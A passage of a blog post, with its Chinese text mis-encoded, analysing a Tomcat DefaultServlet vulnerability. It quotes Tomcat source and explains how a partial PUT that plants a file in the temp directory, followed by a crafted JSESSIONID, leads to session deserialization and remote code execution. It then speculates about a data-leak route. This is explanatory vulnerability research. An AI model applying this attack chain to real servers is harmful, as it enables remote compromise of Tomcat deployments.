</div>

</p>
<h2 id="åŸç†åˆ†æ">åŸç†åˆ†æ</h2>
<h3 id="å…¶ä¸€">å…¶ä¸€</h3>
<p>æ¼æ´ç‚¹åœ¨<code>DefaultServlet</code>ä¸‹çš„doPutæ–¹æ³•ä¸­è°ƒç”¨<code> executePartialPut</code>æ–¹æ³•</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312150329188.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312150329188.png" alt="image-20250312150329188"  />
</a>
</div>

</p>
<p>åœ¨<code> executePartialPut</code>æ–¹æ³•ä¸­,æ ¹æ®ä¼ å…¥çš„pathï¼Œrequeståˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼Œä¿å­˜åœ°å€ä¸ºå½“å‰ServletContextä¸‹çš„ä¸´æ—¶æ–‡ä»¶å¤¹çš„æ ¹ç›®å½•ä¸‹é¢ï¼Œä¸”å°†pathä¸­çš„<code>/</code>è½¬åŒ–ä¸ºäº†<code>.</code></p>
<pre tabindex="0"><code>protected File executePartialPut(HttpServletRequest req, Range range, String path) throws IOException {

    // Append data specified in ranges to existing content for this
    // resource - create a temp. file on the local filesystem to
    // perform this operation
    File tempDir = (File) getServletContext().getAttribute(ServletContext.TEMPDIR);
    // Convert all &#39;/&#39; characters to &#39;.&#39; in resourcePath
    String convertedResourcePath = path.replace(&#39;/&#39;, &#39;.&#39;);
    File contentFile = new File(tempDir, convertedResourcePath);
    if (contentFile.createNewFile()) {
        // Clean up contentFile when Tomcat is terminated
        contentFile.deleteOnExit();
    }

    try (RandomAccessFile randAccessContentFile = new RandomAccessFile(contentFile, &#34;rw&#34;)) {

        WebResource oldResource = resources.getResource(path);

        // Copy data in oldRevisionContent to contentFile
        if (oldResource.isFile()) {
            try (BufferedInputStream bufOldRevStream =
                    new BufferedInputStream(oldResource.getInputStream(), BUFFER_SIZE)) {

                int numBytesRead;
                byte[] copyBuffer = new byte[BUFFER_SIZE];
                while ((numBytesRead = bufOldRevStream.read(copyBuffer)) != -1) {
                    randAccessContentFile.write(copyBuffer, 0, numBytesRead);
                }

            }
        }

        randAccessContentFile.setLength(range.length);

        // Append data in request input stream to contentFile
        randAccessContentFile.seek(range.start);
        int numBytesRead;
        byte[] transferBuffer = new byte[BUFFER_SIZE];
        try (BufferedInputStream requestBufInStream = new BufferedInputStream(req.getInputStream(), BUFFER_SIZE)) {
            while ((numBytesRead = requestBufInStream.read(transferBuffer)) != -1) {
                randAccessContentFile.write(transferBuffer, 0, numBytesRead);
            }
        }
    }

    return contentFile;
}
</code></pre><p>åœ¨è°ƒç”¨<code>executePartialPut</code>ä¹‹å‰æœ‰ä¸ªè¦æ±‚ï¼Œéœ€è¦æˆ‘ä»¬çš„rangeä¸ä¸ºç©ºæˆ–<code>IGNORE</code>,å…¶å®å°±æ˜¯éœ€è¦æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªåˆæ³•çš„<code>Content-Range</code>è¯·æ±‚å¤´ä¾¿å¯ä»¥æˆåŠŸåˆ›å»º</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151011961.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151011961.png" alt="image-20250312151011961"  />
</a>
</div>

</p>
<pre tabindex="0"><code>    protected Range parseContentRange(HttpServletRequest request, HttpServletResponse response) throws IOException {

        // Retrieving the content-range header (if any is specified
        String contentRangeHeader = request.getHeader(&#34;Content-Range&#34;);

        if (contentRangeHeader == null) {
            return IGNORE;
        }

        if (!allowPartialPut) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            return null;
        }

        ContentRange contentRange = ContentRange.parse(new StringReader(contentRangeHeader));

        if (contentRange == null) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            return null;
        }


        // bytes is the only range unit supported
        if (!contentRange.getUnits().equals(&#34;bytes&#34;)) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            return null;
        }

        // TODO: Remove the internal representation and use Ranges
        // Convert to internal representation
        Range range = new Range();
        range.start = contentRange.getStart();
        range.end = contentRange.getEnd();
        range.length = contentRange.getLength();

        if (!range.validate()) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST);
            return null;
        }

        return range;
    }
</code></pre><p>æˆ‘è¿™é‡ŒæˆåŠŸputä¹‹åï¼Œç¼“å­˜æ–‡ä»¶æ‰€åœ¨æ–‡ä»¶å¤¹ä½äº<code>apache-tomcat-9.0.85-src/work/Catalina/localhost/ROOT</code>ï¼Œ</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151349915.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151349915.png" alt="image-20250312151349915"  />
</a>
</div>

</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151412366.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312151412366.png" alt="image-20250312151412366"  />
</a>
</div>

</p>
<h3 id="å…¶äºŒ">å…¶äºŒ</h3>
<p>sessionæ–‡ä»¶çš„é»˜è®¤å­˜å‚¨ç‚¹æ­£å¥½ä½äºå½“å‰Contextçš„ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹</p>
<p><code>FileStore.load</code></p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312181228233.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312181228233.png" alt="image-20250312181228233"  />
</a>
</div>

</p>
<p>ç”¨æˆ·åœ¨ä½¿ç”¨JSESSIONID=idçš„æƒ…å†µä¸‹è®¿é—®æœåŠ¡ï¼ŒFileStoreä¼šè‡ªåŠ¨çš„å»ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹å¯»æ‰¾åå­—ä¸º<code>id.session</code>çš„æ–‡ä»¶å¹¶ä¸”è¿›è¡Œååºåˆ—åŒ–æ“ä½œ
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312181547867.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312181547867.png" alt="image-20250312181547867"  />
</a>
</div>

</p>
<p>æ‰€ä»¥æ”»å‡»æ€è·¯å°±ä¸²è”èµ·æ¥äº†</p>
<ul>
<li>æ”»å‡»è€…é€šè¿‡partialPutæ–¹æ³•å¾€æœåŠ¡ä¸´æ—¶æ–‡ä»¶å¤¹å¡å…¥å­˜æœ‰ååºåˆ—åŒ–æ•°æ®çš„æ–‡ä»¶</li>
<li>æ”»å‡»è€…å†æ¬¡æ„é€ JSESSIONIDä¸º<code>.filename.session</code>çš„è¯·æ±‚ï¼Œè§¦å‘ååºåˆ—åŒ–æ”»å‡»</li>
</ul>
<h3 id="ä¿¡æ¯æ³„éœ²ç¯¡æ”¹">ä¿¡æ¯æ³„éœ²&amp;ç¯¡æ”¹</h3>
<p>è¿™é‡Œæˆ‘çœ‹äº†ä¸€ä¼šå„¿æ²¡æ€è€ƒå‡ºæ¥è¿™ä¸ªä¿¡æ¯æ³„æ¼çš„æ‰‹æ³•ï¼Œè®²è®²æˆ‘åœ¨æ€è€ƒè¿‡ç¨‹ä¸­å‘ç°çš„ä¸€äº›å¯ç–‘ç‚¹å§(æ–¹å‘ä¸ä¿è¯å¯¹)</p>
<p>åœ¨æˆ‘ä»¬åˆ›å»ºäº†rangeçš„æƒ…å†µä¸‹ï¼Œä¸‹æ–¹è¿™ä¸ªifåˆ†æ”¯è¯­å¥ä¸‹æˆ‘ä»¬èƒ½å¤Ÿæ‰§è¡Œä¸¤ç«¯ä»£ç ï¼Œä¸€ä¸ªæ˜¯<code>PartialPut</code>æ–¹æ³•ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯æ ¹æ®contentFileæ¥åˆ›å»ºä¸€ä¸ª</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182108725.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182108725.png" alt="image-20250312182108725"  />
</a>
</div>

</p>
<p>ä¸åŒäº<code>resourceInputStream = req.getInputStream();</code>çš„ç›´æ¥ä»reqä¸­è¯»å–æˆ‘ä»¬çš„è¾“å…¥å†…å®¹ï¼Œè¿™é‡Œçš„æ˜¯æ ¹æ®æˆ‘ä»¬çš„è·¯å¾„å¯»æ‰¾å¯¹åº”æ–‡ä»¶ä¸‹çš„å†…å®¹</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182456062.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182456062.png" alt="image-20250312182456062"  />
</a>
</div>

</p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬putçš„è·¯å¾„ä¹Ÿå¹¶éæ˜¯éœ€è¦æ–‡ä»¶å¤¹ä¸‹ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå­˜åœ¨çš„æ–‡ä»¶æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰§è¡ŒpartialPutæ–¹æ³•ï¼Œæ–¹æ³•ä¼šæ ¹æ®æˆ‘ä»¬çš„<code>Content-Range</code>å¤´æ¥è®²æˆ‘ä»¬putçš„<code>body</code>å†…å®¹è¦†ç›–å¯¹åº”rangeçš„æ•°æ®ï¼Œè¿™é‡Œç®€å•å±•ç¤ºä¸€ä¸‹</p>
<p>è®¿é—®å·²å­˜åœ¨çš„123æ–‡ä»¶</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182816636.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312182816636.png" alt="image-20250312182816636"  />
</a>
</div>

</p>
<p>put 123æ–‡ä»¶ å†…å®¹ä¸º66 rangeä¸ºContent-Range:bytes 200-1000/67589(rangeéšä¾¿è®¾çš„ï¼Œæˆ‘è¿™ä¸ªæ–‡ä»¶é•¿åº¦æ²¡è¿™ä¹ˆé•¿ï¼Œè¿™é‡Œæƒ…å†µæ˜¯è¦†ç›–æœ€ånä½ç­‰åŒäºæˆ‘ä»¬çš„putè¿›çš„å†…å®¹)</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183103023.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183103023.png" alt="image-20250312183103023"  />
</a>
</div>

</p>
<p>ç°åœ¨çœ‹ä¸€çœ¼123</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183122544.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183122544.png" alt="image-20250312183122544"  />
</a>
</div>

</p>
<p>æ‰€ä»¥è¯´partialPutæ–¹æ³•è¯»å–äº†ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹çš„å¯¹åº”æ–‡ä»¶å†…å®¹</p>
<p>éšå<code>resourceInputStream</code>è¿›å…¥äº†<code>resources.write</code>æ–¹æ³•,è¿™ä¸ªæ–¹æ³•ä¸‹æœ‰ä¸ªæ³¨é‡Šæœ‰ç‚¹æ€ª</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183417739.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183417739.png" alt="image-20250312183417739"  />
</a>
</div>

</p>
<p>è¿™ä¸ªcacheå¥½åƒæ˜¯ç”¨æ¥ç»™æ­£åœ¨ä¸Šä¼ çš„æ–‡ä»¶åŠ é”çš„ï¼Ÿæ²¡æœ‰è¢«removeçš„è¯æ— æ³•è¢«è®¿é—®çš„æ ·å­</p>
<p>è¿™é‡Œæœ‰è¿™ä¹ˆäº›æ–‡ä»¶åœ°å€</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183517631.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183517631.png" alt="image-20250312183517631"  />
</a>
</div>

</p>
<p>ä½†æ˜¯åé¢æˆ‘è‡ªå·±æµ‹è¯•ï¼Œå‘ç°å°±ç®—åœ¨è¿™ä¸ªcacheé‡Œå¥½åƒä¹Ÿèƒ½è®¿é—®ï¼Œä¸çŸ¥é“å•¥åŸå› äº†(æ™•)</p>
<p>é‚£æˆ‘å…¶å®å¯¹æ­¤å¤§è‡´çš„æ€è·¯å°±æœ‰ä¸¤ç§</p>
<ol>
<li>é€šè¿‡æŸäº›æŠ¥é”™å°†resourceInputStreamçš„å†…å®¹å¸¦å‡ºæ¥ï¼Œé€ æˆæ³„æ¼</li>
<li>(æˆ‘çš„è¿™ä¸ªcacheç¯å¢ƒæœ‰é—®é¢˜çš„æƒ…å†µä¸‹QAQ)åœ¨cacheä¸­çš„æ–‡ä»¶è·¯å¾„æ— æ³•è®¿é—®ï¼Œä¸”æ•æ„Ÿæ–‡ä»¶åœ¨ç½‘ç«™ç›®å½•ä¸‹çš„å­ç›®å½•(æ–‡ä»¶)ä¸­ï¼Œé€šè¿‡æˆ‘ä»¬æ¶æ„çš„å¾€å¯¹åº”è·¯å¾„æ„é€ putè¯·æ±‚ï¼Œå°†è¯¥æ•æ„Ÿæ–‡ä»¶ä»cacheä¸­removeæ‰ï¼Œä»è€Œèƒ½å¤Ÿè®¿é—®è¿™ä¸ªæ•æ„Ÿæ–‡ä»¶(ä¸è¿‡WEB-INFå’ŒMATA-INFè¿˜æ˜¯è®¿é—®ä¸åˆ°ï¼Œtomcatå·²ç»ç¡¬ç¼–ç åœ¨ä»£ç ä¸­ä¸å‡†ä»¥è¿™ä¿©ç©æ„å¼€å¤´äº†)</li>
</ol>
<h2 id="ç»“å°¾">ç»“å°¾</h2>
<p>åªå¤ç°å‡ºæ¥äº†RCEçš„æ´ï¼Œç®€å•æäº†ä¸€ä¸‹æˆ‘åœ¨ä¿¡æ¯æ³„éœ²è¿™æ–¹é¢çš„ä¸€äº›æ€è·¯ï¼Œå¦‚æœæ–‡ç« å†…å®¹æœ‰é”™è¯¯è¿˜è¯·å¸ˆå‚…è”ç³»æˆ‘çº æ­£ğŸ˜­~</p>

        </div>
    </div>
    <a href="#" id="scrollToTopButton">
        <svg t="1686753152588" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"
            p-id="3988" width="48" height="48">
            <path
                d="M518.5 360.3c-3.2-4.4-9.7-4.4-12.9 0l-178 246c-3.8 5.3 0 12.7 6.5 12.7H381c10.2 0 19.9-4.9 25.9-13.2L512 460.4l105.2 145.4c6 8.3 15.6 13.2 25.9 13.2H690c6.5 0 10.3-7.4 6.5-12.7l-178-246z"
                p-id="3989" fill="#363636"></path>
            <path
                d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64z m0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"
                p-id="3990" fill="#363636"></path>
        </svg>
    </a>

<div class="pp-container">
        <section class="pre-and-post">
            <div class="has-text-left">
                
                <p>Previous post</p>
                <a href="http://localhost:1313/post/2025n1junior-wp/">[2025]N1junior-WP</a>
                
            </div>
            <div class="has-text-right">
                
                <p>Next post</p>
                <a href="http://localhost:1313/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/">è½¯ä»¶æ”»é˜²èµ›ç°åœºèµ›ä¸Šå¯¹justDeserializeæ”»å‡»çš„å‡ æ¬¡å°è¯•</a>
                
            </div>
        </section>
    </div>

</div>

        </main><footer class="footer">
    <div class="content has-text-centered">
    <span>&copy; 2025 <a href="http://localhost:1313/">GSBP&#39;s Blog</a></span>
    
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
    
    <span>
        Powered by
        <a href="https://gohugo.io/" target="_blank">Hugo</a> &
        <a href="https://github.com/hotjuicew/hugo-JuiceBar" target="_blank">JuiceBar</a>
    </span>
    </div>
  </footer>
</body>
</html>

